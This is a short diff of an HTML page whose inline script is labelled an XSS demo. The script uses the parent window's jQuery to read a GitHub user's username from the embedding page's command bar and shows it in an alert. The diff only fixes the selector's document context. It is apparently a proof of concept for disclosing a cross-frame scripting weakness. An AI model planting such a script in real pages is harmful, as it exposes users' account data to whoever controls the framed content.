@@ -5,7 +5,7 @@
   <link href="http:-bootstrap.css" type="text/css" rel="stylesheet">
 <script> 
 var jQuery = window.parent.jQuery;
-var githubUsername = jQuery("#command-bar", window.parent).attr('data-username'); 
+var githubUsername = jQuery("#command-bar", window.parent.document).attr('data-username'); 
 alert("XSS demo: your github username is " + githubUsername);
 </script>
   
